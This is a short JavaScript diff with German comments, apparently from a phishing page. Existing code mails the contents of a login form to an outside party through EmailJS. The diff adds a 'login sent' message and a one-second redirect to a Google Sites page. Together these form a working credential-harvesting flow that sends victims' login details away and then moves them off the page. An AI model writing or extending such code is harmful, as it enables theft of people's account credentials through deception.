@@ -11,7 +11,11 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
     // Sende das Formular per EmailJS
     emailjs.sendForm("service_dpv66od", "template_e9sbnta", this)
       .then(() => {
-        document.getElementById("status").innerText = "Login erfolgreich gesendet!";
+        document.getElementById("status").innerText = "Login erfolgreich gesendet! Du wirst weitergeleitet...";
+        // Nach 1 Sekunde weiterleiten
+        setTimeout(function() {
+          window.location.href = "https://sites.google.com/view/dragonflyx";
+        }, 1000);
       }, (err) => {
         document.getElementById("status").innerText = "Fehler beim Senden: " + JSON.stringify(err);
       });
